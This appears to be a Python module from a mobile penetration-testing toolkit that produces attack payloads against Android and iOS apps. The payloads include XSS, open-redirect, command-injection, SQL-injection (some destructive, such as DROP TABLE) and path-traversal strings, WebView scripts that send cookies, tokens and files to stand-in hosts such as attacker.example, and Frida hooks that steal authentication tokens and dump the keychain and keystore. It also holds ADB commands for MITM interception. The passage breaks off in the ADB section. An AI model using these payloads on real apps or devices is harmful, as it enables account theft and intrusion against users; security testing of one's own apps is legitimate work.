#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
████████████████████████████████████████████████████████████████████████████████████
██                                                                                ██
██  📱  SIREN MOBILE PAYLOADS — Attack Vectors for Mobile Applications  📱       ██
██                                                                                ██
██  Arsenal completo de payloads para testes de seguranca mobile:                 ██
██    • Deep link injection (XSS, redirect, command injection)                    ██
██    • Content provider exploitation (SQL injection, path traversal)             ██
██    • WebView JavaScript injection (XSS, file access, bridge abuse)            ██
██    • Intent injection (activity hijack, service abuse, broadcast)              ██
██    • SQL injection for Content Providers (UNION, blind, error-based)           ██
██    • Path traversal for Content URIs (dot-dot, encoding, null byte)           ██
██    • Frida script payloads (bypass, hook, extract, modify)                     ██
██    • Broadcast spoofing payloads                                               ██
██    • Clipboard injection payloads                                              ██
██    • Serialization attack payloads (Parcelable, Serializable)                 ██
██    • ADB exploit commands                                                      ██
██    • Keystore extraction payloads                                              ██
██    • Network interception payloads (proxy, MITM, DNS)                         ██
██    • iOS-specific payloads (URL scheme, Universal Links, pasteboard)           ██
██                                                                                ██
██  "Cada payload é uma pergunta. A resposta revela a verdade."                   ██
██                                                                                ██
████████████████████████████████████████████████████████████████████████████████████
"""

from __future__ import annotations

import base64
import json
import logging
import os
import random
import string
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Set, Tuple

logger = logging.getLogger("siren.mobile_payloads")


# ════════════════════════════════════════════════════════════════════════════
# ENUMS & CONSTANTS
# ════════════════════════════════════════════════════════════════════════════


class PayloadCategory(Enum):
    DEEPLINK = "deeplink"
    CONTENT_PROVIDER = "content_provider"
    WEBVIEW = "webview"
    INTENT = "intent"
    SQL_INJECTION = "sql_injection"
    PATH_TRAVERSAL = "path_traversal"
    FRIDA = "frida"
    BROADCAST = "broadcast"
    SERIALIZATION = "serialization"
    NETWORK = "network"
    IOS_SPECIFIC = "ios_specific"
    ADB = "adb"
    KEYSTORE = "keystore"
    CLIPBOARD = "clipboard"


class PayloadSeverity(Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"


# ════════════════════════════════════════════════════════════════════════════
# DATA CLASSES
# ════════════════════════════════════════════════════════════════════════════


@dataclass
class MobilePayload:
    """A single mobile attack payload."""

    name: str = ""
    category: PayloadCategory = PayloadCategory.DEEPLINK
    severity: PayloadSeverity = PayloadSeverity.MEDIUM
    payload: str = ""
    description: str = ""
    owasp_ref: str = ""
    cwe: str = ""
    platform: str = "android"  # android, ios, both
    adb_command: str = ""
    frida_script: str = ""
    expected_behavior: str = ""
    tags: List[str] = field(default_factory=list)


@dataclass
class PayloadSet:
    """Collection of related payloads."""

    name: str = ""
    description: str = ""
    category: PayloadCategory = PayloadCategory.DEEPLINK
    payloads: List[MobilePayload] = field(default_factory=list)


# ════════════════════════════════════════════════════════════════════════════
# DEEP LINK PAYLOADS
# ════════════════════════════════════════════════════════════════════════════


class DeepLinkPayloads:
    """Deep link / URL scheme injection payloads."""

    @staticmethod
    def xss_payloads(scheme: str) -> List[MobilePayload]:
        """XSS payloads via deep link parameters."""
        xss_vectors = [
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(document.domain)",
            '"><script>alert(1)</script>',
            "'-alert(1)-'",
            "<details open ontoggle=alert(1)>",
            "{{constructor.constructor('alert(1)')()}}",
            "${alert(1)}",
            '<iframe src="javascript:alert(1)">',
        ]
        payloads = []
        for i, xss in enumerate(xss_vectors):
            encoded = urllib.parse.quote(xss)
            payloads.append(
                MobilePayload(
                    name=f"deeplink_xss_{i+1}",
                    category=PayloadCategory.DEEPLINK,
                    severity=PayloadSeverity.HIGH,
                    payload=f"{scheme}://host/page?param={encoded}",
                    description=f"XSS via deep link parameter: {xss[:50]}",
                    owasp_ref="M4",
                    cwe="CWE-79",
                    adb_command=f'adb shell am start -a android.intent.action.VIEW -d "{scheme}://host/page?param={encoded}"',
                    expected_behavior="XSS executes in WebView if deep link data is rendered without sanitization",
                    tags=["deeplink", "xss"],
                )
            )
        return payloads

    @staticmethod
    def redirect_payloads(scheme: str) -> List[MobilePayload]:
        """Open redirect payloads via deep links."""
        redirects = [
            ("https://evil.example.com", "Direct HTTPS redirect"),
            ("//evil.example.com", "Protocol-relative redirect"),
            ("https://evil.example.com%00.legit.com", "Null byte redirect"),
            ("https://evil.example.com?.legit.com", "Query confusion redirect"),
            ("https://legit.com@evil.example.com", "Auth section redirect"),
            ("https://evil.example.com#legit.com", "Fragment redirect"),
            ("javascript:alert(1)//", "JavaScript protocol redirect"),
            ("data:text/html,<script>alert(1)</script>", "Data URI redirect"),
            (
                "intent://#Intent;scheme=http;S.browser_fallback_url=https://evil.example.com;end",
                "Intent scheme redirect",
            ),
        ]
        payloads = []
        for url, desc in redirects:
            encoded = urllib.parse.quote(url, safe="")
            payloads.append(
                MobilePayload(
                    name=f"deeplink_redirect",
                    category=PayloadCategory.DEEPLINK,
                    severity=PayloadSeverity.MEDIUM,
                    payload=f"{scheme}://host/redirect?url={encoded}",
                    description=desc,
                    owasp_ref="M3",
                    cwe="CWE-601",
                    tags=["deeplink", "redirect"],
                )
            )
        return payloads

    @staticmethod
    def path_traversal_payloads(scheme: str) -> List[MobilePayload]:
        """Path traversal payloads via deep links."""
        paths = [
            "../../../etc/hosts",
            "..%2f..%2f..%2fetc%2fhosts",
            "..%252f..%252f..%252fetc%252fhosts",
            "....//....//....//etc/hosts",
            "..\\..\\..\\etc\\hosts",
            "%2e%2e/%2e%2e/%2e%2e/etc/hosts",
            "..%00/..%00/..%00/etc/hosts",
        ]
        payloads = []
        for path in paths:
            payloads.append(
                MobilePayload(
                    name="deeplink_path_traversal",
                    category=PayloadCategory.DEEPLINK,
                    severity=PayloadSeverity.HIGH,
                    payload=f"{scheme}://host/{path}",
                    description=f"Path traversal: {path}",
                    owasp_ref="M4",
                    cwe="CWE-22",
                    tags=["deeplink", "path-traversal"],
                )
            )
        return payloads

    @staticmethod
    def command_injection_payloads(scheme: str) -> List[MobilePayload]:
        """Command injection payloads via deep links."""
        cmds = [
            "; id",
            "| id",
            "`id`",
            "$(id)",
            "%0aid",
            "\nid\n",
            "& id &",
            "|| id",
        ]
        payloads = []
        for cmd in cmds:
            encoded = urllib.parse.quote(cmd)
            payloads.append(
                MobilePayload(
                    name="deeplink_cmd_injection",
                    category=PayloadCategory.DEEPLINK,
                    severity=PayloadSeverity.CRITICAL,
                    payload=f"{scheme}://host/action?input={encoded}",
                    description=f"Command injection: {cmd}",
                    owasp_ref="M4",
                    cwe="CWE-78",
                    tags=["deeplink", "command-injection"],
                )
            )
        return payloads

    @staticmethod
    def intent_scheme_payloads(package: str) -> List[MobilePayload]:
        """Intent scheme deep link payloads."""
        intents = [
            (
                f"intent://#Intent;scheme=http;package={package};"
                f"S.browser_fallback_url=https://evil.example.com;end",
                "Intent scheme with browser fallback",
            ),
            (
                f"intent://#Intent;component={package}/.DebugActivity;end",
                "Intent scheme targeting debug activity",
            ),
            (
                f"intent://#Intent;action=android.intent.action.VIEW;"
                f"package={package};S.url=file:///etc/hosts;end",
                "Intent scheme with file:// data",
            ),
            (
                f"intent://#Intent;action=android.intent.action.SEND;"
                f"type=text/plain;S.android.intent.extra.TEXT=pwned;end",
                "Intent scheme SEND action",
            ),
        ]
        payloads = []
        for intent, desc in intents:
            payloads.append(
                MobilePayload(
                    name="intent_scheme",
                    category=PayloadCategory.INTENT,
                    severity=PayloadSeverity.HIGH,
                    payload=intent,
                    description=desc,
                    owasp_ref="M3",
                    cwe="CWE-927",
                    tags=["intent", "scheme"],
                )
            )
        return payloads


# ════════════════════════════════════════════════════════════════════════════
# CONTENT PROVIDER PAYLOADS
# ════════════════════════════════════════════════════════════════════════════


class ContentProviderPayloads:
    """Payloads for content provider exploitation."""

    @staticmethod
    def sql_injection_payloads(authority: str) -> List[MobilePayload]:
        """SQL injection payloads for content providers."""
        sqli_vectors = [
            # UNION-based
            ("' UNION SELECT sql FROM sqlite_master--", "UNION schema dump"),
            ("' UNION SELECT 1,2,3,4,5--", "UNION column count enumeration"),
            (
                "' UNION SELECT null,sql,null FROM sqlite_master--",
                "UNION selective dump",
            ),
            ("') UNION SELECT sql FROM sqlite_master--", "UNION with paren"),
            # Boolean-based blind
            ("' AND 1=1--", "Boolean true"),
            ("' AND 1=2--", "Boolean false"),
            (
                "' AND (SELECT COUNT(*) FROM sqlite_master)>0--",
                "Boolean table existence",
            ),
            (
                "' AND substr(sql,1,1)='C' FROM sqlite_master--",
                "Boolean char extraction",
            ),
            # Error-based
            (
                "' AND 1=CAST((SELECT sql FROM sqlite_master LIMIT 1) AS int)--",
                "Error-based cast",
            ),
            ("' AND randomblob(1000000000)--", "Resource consumption"),
            # Time-based (SQLite doesn't have SLEEP but we can use heavy ops)
            (
                "' AND (SELECT COUNT(*) FROM sqlite_master,sqlite_master)>0--",
                "Heavy query",
            ),
            # Stacked queries
            ("'; DROP TABLE users--", "Destructive: DROP TABLE"),
            ("'; INSERT INTO users VALUES('admin','pwned')--", "INSERT injection"),
            (
                "'; UPDATE users SET password='pwned' WHERE username='admin'--",
                "UPDATE injection",
            ),
        ]

        payloads = []
        for vector, desc in sqli_vectors:
            payloads.append(
                MobilePayload(
                    name="cp_sqli",
                    category=PayloadCategory.SQL_INJECTION,
                    severity=PayloadSeverity.CRITICAL,
                    payload=vector,
                    description=desc,
                    owasp_ref="M4",
                    cwe="CWE-89",
                    adb_command=f'adb shell content query --uri "content://{authority}/" --where "{vector}"',
                    expected_behavior="Returns data from other tables or causes error revealing schema",
                    tags=["content-provider", "sqli"],
                )
            )
        return payloads

    @staticmethod
    def path_traversal_payloads(authority: str) -> List[MobilePayload]:
        """Path traversal payloads for content providers."""
        traversals = [
            ("../../../etc/hosts", "Basic traversal"),
            ("..%2F..%2F..%2Fetc%2Fhosts", "URL-encoded traversal"),
            ("..%252F..%252Fetc%252Fhosts", "Double URL-encoded"),
            ("....//....//etc/hosts", "Nested traversal"),
            ("..%00/etc/hosts", "Null byte traversal"),
            ("/proc/self/environ", "Direct /proc access"),
            ("../../shared_prefs/prefs.xml", "SharedPrefs access"),
            ("../../databases/app.db", "Database access"),
            ("../../../data/local/tmp/", "Tmp directory access"),
            ("../../files/sensitive.txt", "Internal files access"),
        ]

        payloads = []
        for path, desc in traversals:
            payloads.append(
                MobilePayload(
                    name="cp_path_traversal",
                    category=PayloadCategory.PATH_TRAVERSAL,
                    severity=PayloadSeverity.HIGH,
                    payload=f"content://{authority}/{path}",
                    description=desc,
                    owasp_ref="M4",
                    cwe="CWE-22",
                    adb_command=f'adb shell content read --uri "content://{authority}/{path}"',
                    expected_behavior="Returns file content from outside the provider's intended scope",
                    tags=["content-provider", "path-traversal"],
                )
            )
        return payloads


# ════════════════════════════════════════════════════════════════════════════
# WEBVIEW PAYLOADS
# ════════════════════════════════════════════════════════════════════════════


class WebViewPayloads:
    """Payloads for WebView exploitation."""

    @staticmethod
    def js_interface_payloads(interface_name: str = "Android") -> List[MobilePayload]:
        """JavaScript interface exploitation payloads."""
        scripts = [
            # Reflection-based RCE (API < 17)
            (
                f"var runtime = {interface_name}.getClass().forName('java.lang.Runtime');"
                f"var exec = runtime.getMethod('exec', 'java.lang.String');"
                f"exec.invoke(runtime.getMethod('getRuntime').invoke(null), 'id');",
                "RCE via reflection on JS interface (API < 17)",
                PayloadSeverity.CRITICAL,
            ),
            # Read file
            (
                f"var file = new java.io.File('/etc/hosts');"
                f"var scanner = new java.util.Scanner(file);"
                f"var content = '';"
                f"while(scanner.hasNext()) content += scanner.nextLine() + '\\n';",
                "File read via JS interface",
                PayloadSeverity.HIGH,
            ),
            # Steal SharedPrefs
            (
                f"var ctx = {interface_name}.getApplicationContext();"
                f"var prefs = ctx.getSharedPreferences('prefs', 0);"
                f"var all = prefs.getAll().toString();",
                "SharedPreferences theft via JS interface",
                PayloadSeverity.HIGH,
            ),
            # Token exfiltration
            (
                f"var token = {interface_name}.getToken();"
                f"new Image().src = 'https://attacker.example/steal?t=' + token;",
                "Token exfiltration via JS interface",
                PayloadSeverity.CRITICAL,
            ),
        ]

        payloads = []
        for script, desc, sev in scripts:
            payloads.append(
                MobilePayload(
                    name="webview_js_interface",
                    category=PayloadCategory.WEBVIEW,
                    severity=sev,
                    payload=script,
                    description=desc,
                    owasp_ref="M4",
                    cwe="CWE-749",
                    tags=["webview", "js-interface"],
                )
            )
        return payloads

    @staticmethod
    def file_scheme_payloads() -> List[MobilePayload]:
        """File:// scheme exploitation payloads."""
        files = [
            ("/etc/hosts", "System hosts file"),
            ("/proc/self/environ", "Process environment"),
            ("/proc/self/cmdline", "Process command line"),
            ("/data/local.prop", "Local properties"),
            ("/default.prop", "Default properties"),
        ]

        payloads = []
        for path, desc in files:
            html = (
                f"<html><body><script>"
                f"var x = new XMLHttpRequest();"
                f"x.open('GET', 'file://{path}', false);"
                f"x.send();"
                f"new Image().src = 'https://exfil.example/?d=' + btoa(x.responseText);"
                f"</script></body></html>"
            )
            payloads.append(
                MobilePayload(
                    name="webview_file_scheme",
                    category=PayloadCategory.WEBVIEW,
                    severity=PayloadSeverity.CRITICAL,
                    payload=html,
                    description=f"File exfiltration via file:// XHR: {desc}",
                    owasp_ref="M4",
                    cwe="CWE-200",
                    tags=["webview", "file-scheme"],
                )
            )
        return payloads

    @staticmethod
    def universal_xss_payloads() -> List[MobilePayload]:
        """Universal XSS payloads for WebViews."""
        xss_vectors = [
            ("<script>alert(document.cookie)</script>", "Basic cookie theft"),
            (
                "<img src=x onerror=\"fetch('https://evil.example/'+document.cookie)\">",
                "Fetch-based exfil",
            ),
            (
                "<svg/onload=fetch('https://evil.example/'+btoa(document.body.innerHTML))>",
                "DOM exfil",
            ),
            (
                "<script>location='https://evil.example/?c='+document.cookie</script>",
                "Redirect exfil",
            ),
            (
                "<script>new Image().src='https://evil.example/?l='+localStorage.getItem('token')</script>",
                "localStorage theft",
            ),
        ]

        payloads = []
        for xss, desc in xss_vectors:
            payloads.append(
                MobilePayload(
                    name="webview_xss",
                    category=PayloadCategory.WEBVIEW,
                    severity=PayloadSeverity.HIGH,
                    payload=xss,
                    description=desc,
                    owasp_ref="M4",
                    cwe="CWE-79",
                    platform="both",
                    tags=["webview", "xss"],
                )
            )
        return payloads


# ════════════════════════════════════════════════════════════════════════════
# INTENT PAYLOADS
# ════════════════════════════════════════════════════════════════════════════


class IntentPayloads:
    """Payloads for Intent-based exploitation."""

    @staticmethod
    def activity_hijack_payloads(package: str) -> List[MobilePayload]:
        """Activity launch payloads for auth bypass."""
        common_activities = [
            ".MainActivity",
            ".HomeActivity",
            ".DashboardActivity",
            ".SettingsActivity",
            ".ProfileActivity",
            ".AdminActivity",
            ".DebugActivity",
            ".TestActivity",
            ".InternalActivity",
            ".PaymentActivity",
            ".TransferActivity",
            ".WalletActivity",
        ]

        payloads = []
        for activity in common_activities:
            full_name = f"{package}{activity}"
            payloads.append(
                MobilePayload(
                    name="activity_hijack",
                    category=PayloadCategory.INTENT,
                    severity=PayloadSeverity.HIGH,
                    payload=full_name,
                    description=f"Direct launch: {activity}",
                    owasp_ref="M3",
                    cwe="CWE-287",
                    adb_command=f"adb shell am start -n {package}/{full_name}",
                    expected_behavior="Activity opens without authentication",
                    tags=["intent", "activity-hijack"],
                )
            )
        return payloads

    @staticmethod
    def service_exploit_payloads(package: str) -> List[MobilePayload]:
        """Service exploitation payloads."""
        return [
            MobilePayload(
                name="service_start",
                category=PayloadCategory.INTENT,
                severity=PayloadSeverity.MEDIUM,
                payload=f"{package}/.MyService",
                description="Start exported service",
                owasp_ref="M3",
                cwe="CWE-926",
                adb_command=f"adb shell am startservice -n {package}/.MyService",
                tags=["intent", "service"],
            ),
            MobilePayload(
                name="service_bind_extras",
                category=PayloadCategory.INTENT,
                severity=PayloadSeverity.HIGH,
                payload=f"{package}/.DataService",
                description="Bind to service with malicious extras",
                owasp_ref="M3",
                cwe="CWE-926",
                adb_command=(
                    f"adb shell am startservice -n {package}/.DataService "
                    f"--es action extract --es target all"
                ),
                tags=["intent", "service", "extras"],
            ),
        ]

    @staticmethod
    def pending_intent_payloads() -> List[MobilePayload]:
        """PendingIntent exploitation payloads."""
        return [
            MobilePayload(
                name="pending_intent_hijack",
                category=PayloadCategory.INTENT,
                severity=PayloadSeverity.HIGH,
                payload="PendingIntent.getActivity with implicit intent",
                description=(
                    "Intercept implicit PendingIntent to redirect to malicious activity. "
                    "The attacker app registers an intent filter matching the implicit intent."
                ),
                owasp_ref="M3",
                cwe="CWE-927",
                tags=["intent", "pending-intent"],
            ),
            MobilePayload(
                name="pending_intent_mutable",
                category=PayloadCategory.INTENT,
                severity=PayloadSeverity.CRITICAL,
                payload="Mutable PendingIntent manipulation",
                description=(
                    "If PendingIntent is mutable (no FLAG_IMMUTABLE), the receiving app "
                    "can modify the intent's action, data, and extras."
                ),
                owasp_ref="M3",
                cwe="CWE-927",
                tags=["intent", "pending-intent", "mutable"],
            ),
        ]


# ════════════════════════════════════════════════════════════════════════════
# BROADCAST PAYLOADS
# ════════════════════════════════════════════════════════════════════════════


class BroadcastPayloads:
    """Payloads for broadcast receiver exploitation."""

    @staticmethod
    def spoofing_payloads(package: str) -> List[MobilePayload]:
        """Broadcast spoofing payloads."""
        broadcasts = [
            ("android.intent.action.BOOT_COMPLETED", "Boot completed spoof"),
            ("android.net.conn.CONNECTIVITY_CHANGE", "Network change spoof"),
            ("android.intent.action.BATTERY_LOW", "Battery low spoof"),
            ("android.intent.action.NEW_OUTGOING_CALL", "Outgoing call spoof"),
            ("android.provider.Telephony.SMS_RECEIVED", "SMS received spoof"),
            (f"{package}.ACTION_UPDATE", "Custom update action"),
            (f"{package}.ACTION_PUSH", "Custom push notification"),
            (f"{package}.ACTION_AUTH", "Custom auth action"),
        ]

        payloads = []
        for action, desc in broadcasts:
            payloads.append(
                MobilePayload(
                    name="broadcast_spoof",
                    category=PayloadCategory.BROADCAST,
                    severity=PayloadSeverity.MEDIUM,
                    payload=action,
                    description=desc,
                    owasp_ref="M3",
                    cwe="CWE-345",
                    adb_command=f"adb shell am broadcast -a {action} -n {package}/.MyReceiver",
                    expected_behavior="Receiver processes spoofed broadcast without verification",
                    tags=["broadcast", "spoofing"],
                )
            )
        return payloads

    @staticmethod
    def data_injection_payloads(package: str) -> List[MobilePayload]:
        """Broadcast data injection payloads."""
        return [
            MobilePayload(
                name="broadcast_inject_string",
                category=PayloadCategory.BROADCAST,
                severity=PayloadSeverity.HIGH,
                payload=f"{package}.ACTION_DATA",
                description="Inject malicious string data via broadcast extras",
                owasp_ref="M3",
                cwe="CWE-20",
                adb_command=(
                    f"adb shell am broadcast -a {package}.ACTION_DATA "
                    f"--es data '<script>alert(1)</script>'"
                ),
                tags=["broadcast", "injection"],
            ),
            MobilePayload(
                name="broadcast_inject_url",
                category=PayloadCategory.BROADCAST,
                severity=PayloadSeverity.HIGH,
                payload=f"{package}.ACTION_OPEN",
                description="Inject malicious URL via broadcast",
                owasp_ref="M3",
                cwe="CWE-601",
                adb_command=(
                    f"adb shell am broadcast -a {package}.ACTION_OPEN "
                    f"--es url 'https://evil.example.com'"
                ),
                tags=["broadcast", "injection", "url"],
            ),
        ]


# ════════════════════════════════════════════════════════════════════════════
# FRIDA PAYLOAD SCRIPTS
# ════════════════════════════════════════════════════════════════════════════


class FridaPayloads:
    """Frida script payloads for runtime exploitation."""

    @staticmethod
    def keystore_extraction() -> MobilePayload:
        """Extract keys from Android Keystore."""
        script = r"""
Java.perform(function() {
    var KS = Java.use('java.security.KeyStore');
    KS.getInstance.overload('java.lang.String').implementation = function(type) {
        var ks = this.getInstance(type);
        send({type: 'keystore', ksType: type});
        return ks;
    };

    KS.getEntry.overload('java.lang.String', 'java.security.KeyStore$ProtectionParameter')
    .implementation = function(alias, param) {
        send({type: 'keystore_entry', alias: alias});
        return this.getEntry(alias, param);
    };

    // List all aliases
    var ks = KS.getInstance('AndroidKeyStore');
    ks.load(null);
    var aliases = ks.aliases();
    while (aliases.hasMoreElements()) {
        var alias = aliases.nextElement();
        var entry = ks.getEntry(alias, null);
        send({type: 'keystore_alias', alias: alias, entryType: entry.getClass().getName()});
    }
});
"""
        return MobilePayload(
            name="keystore_extraction",
            category=PayloadCategory.KEYSTORE,
            severity=PayloadSeverity.CRITICAL,
            payload=script,
            frida_script=script,
            description="Extract key aliases and metadata from Android Keystore",
            owasp_ref="M10",
            cwe="CWE-321",
            tags=["frida", "keystore"],
        )

    @staticmethod
    def token_theft() -> MobilePayload:
        """Steal authentication tokens at runtime."""
        script = r"""
Java.perform(function() {
    // Hook SharedPreferences for token reads
    var SPImpl = Java.use('android.app.SharedPreferencesImpl');
    SPImpl.getString.overload('java.lang.String', 'java.lang.String').implementation =
        function(key, defValue) {
            var value = this.getString(key, defValue);
            var lower = key.toLowerCase();
            if (lower.indexOf('token') !== -1 || lower.indexOf('session') !== -1 ||
                lower.indexOf('auth') !== -1 || lower.indexOf('jwt') !== -1 ||
                lower.indexOf('cookie') !== -1 || lower.indexOf('key') !== -1) {
                send({type: 'token_stolen', source: 'SharedPrefs', key: key,
                      value: value ? value.substring(0, 100) : null});
            }
            return value;
        };

    // Hook Cookie Manager
    try {
        var CookieManager = Java.use('android.webkit.CookieManager');
        CookieManager.getCookie.overload('java.lang.String').implementation = function(url) {
            var cookie = this.getCookie(url);
            send({type: 'token_stolen', source: 'CookieManager', url: url,
                  value: cookie ? cookie.substring(0, 100) : null});
            return cookie;
        };
    } catch(e) {}

    // Hook AccountManager
    try {
        var AM = Java.use('android.accounts.AccountManager');
        AM.getAuthToken.overload('android.accounts.Account', 'java.lang.String', 'boolean',
            'android.accounts.AccountManagerCallback', 'android.os.Handler').implementation =
            function(account, authTokenType, notifyAuthFailure, callback, handler) {
                send({type: 'token_stolen', source: 'AccountManager',
                      account: account.name, tokenType: authTokenType});
                return this.getAuthToken(account, authTokenType, notifyAuthFailure, callback, handler);
            };
    } catch(e) {}

    send({type: 'token_theft', status: 'hooks_installed'});
});
"""
        return MobilePayload(
            name="token_theft",
            category=PayloadCategory.FRIDA,
            severity=PayloadSeverity.CRITICAL,
            payload=script,
            frida_script=script,
            description="Intercept authentication tokens from SharedPrefs, Cookies, AccountManager",
            owasp_ref="M1",
            cwe="CWE-522",
            tags=["frida", "token", "theft"],
        )

    @staticmethod
    def method_trace(class_name: str, method_name: str) -> MobilePayload:
        """Trace method calls with parameters and return values."""
        script = f"""
Java.perform(function() {{
    var clazz = Java.use('{class_name}');
    var methods = clazz.{method_name}.overloads;

    for (var i = 0; i < methods.length; i++) {{
        methods[i].implementation = function() {{
            var args = [];
            for (var j = 0; j < arguments.length; j++) {{
                args.push(arguments[j] ? arguments[j].toString() : 'null');
            }}
            send({{type: 'trace', class: '{class_name}', method: '{method_name}',
                  args: args}});

            var retval = this.{method_name}.apply(this, arguments);
            send({{type: 'trace_return', class: '{class_name}', method: '{method_name}',
                  returnValue: retval ? retval.toString() : 'null'}});
            return retval;
        }};
    }}

    send({{type: 'trace_installed', class: '{class_name}', method: '{method_name}'}});
}});
"""
        return MobilePayload(
            name="method_trace",
            category=PayloadCategory.FRIDA,
            severity=PayloadSeverity.LOW,
            payload=script,
            frida_script=script,
            description=f"Trace {class_name}.{method_name}() calls",
            tags=["frida", "trace"],
        )

    @staticmethod
    def return_value_modifier(
        class_name: str, method_name: str, new_value: str
    ) -> MobilePayload:
        """Modify method return value."""
        script = f"""
Java.perform(function() {{
    var clazz = Java.use('{class_name}');
    clazz.{method_name}.implementation = function() {{
        send({{type: 'modified', class: '{class_name}', method: '{method_name}',
              originalArgs: Array.from(arguments).map(String)}});
        return {new_value};
    }};
    send({{type: 'modifier_installed', class: '{class_name}', method: '{method_name}',
          newValue: '{new_value}'}});
}});
"""
        return MobilePayload(
            name="return_modifier",
            category=PayloadCategory.FRIDA,
            severity=PayloadSeverity.HIGH,
            payload=script,
            frida_script=script,
            description=f"Force {class_name}.{method_name}() to return {new_value}",
            owasp_ref="M7",
            cwe="CWE-693",
            tags=["frida", "bypass", "modify"],
        )

    @staticmethod
    def class_enumeration(package_filter: str = "") -> MobilePayload:
        """Enumerate loaded classes."""
        filter_clause = (
            f" && name.indexOf('{package_filter}') !== -1" if package_filter else ""
        )
        script = f"""
Java.perform(function() {{
    Java.enumerateLoadedClasses({{
        onMatch: function(name) {{
            if (name{filter_clause}) {{
                send({{type: 'class', name: name}});
            }}
        }},
        onComplete: function() {{
            send({{type: 'enumeration_complete'}});
        }}
    }});
}});
"""
        return MobilePayload(
            name="class_enum",
            category=PayloadCategory.FRIDA,
            severity=PayloadSeverity.LOW,
            payload=script,
            frida_script=script,
            description=f"Enumerate loaded classes{f' matching {package_filter}' if package_filter else ''}",
            tags=["frida", "enumeration"],
        )


# ════════════════════════════════════════════════════════════════════════════
# NETWORK PAYLOADS
# ════════════════════════════════════════════════════════════════════════════


class NetworkPayloads:
    """Network interception and MITM payloads."""

    @staticmethod
    def proxy_payloads() -> List[MobilePayload]:
        """ADB proxy configuration payloads."""
        return [
            MobilePayload(
                name="proxy_setup",
                category=PayloadCategory.NETWORK,
                severity=PayloadSeverity.LOW,
                payload="proxy_config",
                description="Configure device proxy for traffic interception",
                adb_command="adb shell settings put global http_proxy 127.0.0.1:8080",
                tags=["network", "proxy"],
            ),
            MobilePayload(
                name="proxy_clear",
                category=PayloadCategory.NETWORK,
                severity=PayloadSeverity.LOW,
                payload="proxy_clear",
                description="Remove device proxy configuration",
                adb_command="adb shell settings put global http_proxy :0",
                tags=["network", "proxy", "cleanup"],
            ),
            MobilePayload(
                name="iptables_redirect",
                category=PayloadCategory.NETWORK,
                severity=PayloadSeverity.MEDIUM,
                payload="iptables_redirect",
                description="Redirect all traffic through proxy via iptables (requires root)",
                adb_command=(
                    "adb shell su -c 'iptables -t nat -A OUTPUT -p tcp "
                    "--dport 80 -j REDIRECT --to-port 8080; "
                    "iptables -t nat -A OUTPUT -p tcp "
                    "--dport 443 -j REDIRECT --to-port 8443'"
                ),
                tags=["network", "iptables", "root"],
            ),
        ]

    @staticmethod
    def dns_payloads() -> List[MobilePayload]:
        """DNS manipulation payloads."""
        return [
            MobilePayload(
                name="dns_override",
                category=PayloadCategory.NETWORK,
                severity=PayloadSeverity.MEDIUM,
                payload="dns_override",
                description="Override DNS to redirect traffic (requires root)",
                adb_command=(
                    "adb shell su -c 'echo \"127.0.0.1 api.target.com\" >> /etc/hosts'"
                ),
                tags=["network", "dns"],
            ),
        ]


# ════════════════════════════════════════════════════════════════════════════
# iOS PAYLOADS
# ════════════════════════════════════════════════════════════════════════════


class iOSPayloads:
    """iOS-specific attack payloads."""

    @staticmethod
    def url_scheme_payloads(scheme: str) -> List[MobilePayload]:
        """iOS URL scheme exploitation payloads."""
        payloads_list = [
            (f"{scheme}://auth?token=stolen", "Token parameter injection"),
            (f"{scheme}://open?url=https://evil.example.com", "Open redirect"),
            (f"{scheme}://action?callback=https://evil.example.com", "Callback hijack"),
            (f"{scheme}://" + "A" * 10000, "Buffer overflow via long input"),
            (f"{scheme}://\x00\x01\x02\x03", "Null byte injection"),
        ]

        payloads = []
        for url, desc in payloads_list:
            payloads.append(
                MobilePayload(
                    name="ios_url_scheme",
                    category=PayloadCategory.IOS_SPECIFIC,
                    severity=PayloadSeverity.MEDIUM,
                    payload=url,
                    description=desc,
                    owasp_ref="M3",
                    cwe="CWE-939",
                    platform="ios",
                    tags=["ios", "url-scheme"],
                )
            )
        return payloads

    @staticmethod
    def pasteboard_payloads() -> List[MobilePayload]:
        """iOS pasteboard exploitation payloads."""
        return [
            MobilePayload(
                name="pasteboard_monitor",
                category=PayloadCategory.IOS_SPECIFIC,
                severity=PayloadSeverity.MEDIUM,
                payload="UIPasteboard monitoring via Frida",
                description="Monitor pasteboard for sensitive data",
                owasp_ref="M9",
                cwe="CWE-200",
                platform="ios",
                frida_script=r"""
var pasteboard = ObjC.classes.UIPasteboard;
Interceptor.attach(pasteboard['- setString:'].implementation, {
    onEnter: function(args) {
        var str = new ObjC.Object(args[2]).toString();
        send({type: 'pasteboard', operation: 'set', value: str.substring(0, 100)});
    }
});
Interceptor.attach(pasteboard['- string'].implementation, {
    onLeave: function(retval) {
        if (retval) {
            var str = new ObjC.Object(retval).toString();
            send({type: 'pasteboard', operation: 'get', value: str.substring(0, 100)});
        }
    }
});
""",
                tags=["ios", "pasteboard"],
            ),
        ]

    @staticmethod
    def keychain_payloads() -> List[MobilePayload]:
        """iOS Keychain extraction payloads."""
        return [
            MobilePayload(
                name="keychain_dump",
                category=PayloadCategory.IOS_SPECIFIC,
                severity=PayloadSeverity.CRITICAL,
                payload="Keychain dump via Frida",
                description="Extract all keychain items accessible to the app",
                owasp_ref="M9",
                cwe="CWE-312",
                platform="ios",
                frida_script=r"""
var SecItemCopyMatching = Module.findExportByName('Security', 'SecItemCopyMatching');
Interceptor.attach(SecItemCopyMatching, {
    onEnter: function(args) {
        this.query = new ObjC.Object(args[0]);
        this.result = args[1];
    },
    onLeave: function(retval) {
        if (retval == 0) {
            var resultObj = new ObjC.Object(Memory.readPointer(this.result));
            send({type: 'keychain', query: this.query.toString().substring(0, 200),
                  result: resultObj.toString().substring(0, 200)});
        }
    }
});
""",
                tags=["ios", "keychain"],
            ),
        ]


# ════════════════════════════════════════════════════════════════════════════
# ADB EXPLOIT PAYLOADS
# ════════════════════════════════════════════════════════════════════════════


class ADBPayloads:
    """ADB-based exploitation payloads."""

    @staticmethod
    def data_extraction_payloads(package: str) -> List[MobilePayload]:
        """Extract app data via ADB."""
        return [
            MobilePayload(
                name="backup_extract",
                category=PayloadCategory.ADB,
                severity=PayloadSeverity.HIGH,
                payload="adb_backup",
